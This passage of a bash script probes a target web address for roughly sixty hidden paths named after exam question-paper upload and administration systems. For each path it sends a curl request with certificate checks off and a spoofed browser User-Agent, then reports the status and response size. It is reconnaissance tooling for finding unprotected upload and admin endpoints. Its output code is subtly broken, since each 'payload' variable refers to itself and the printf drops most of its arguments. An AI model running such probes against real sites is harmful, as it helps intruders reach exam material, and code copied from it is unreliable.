code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuiteQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuiteQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

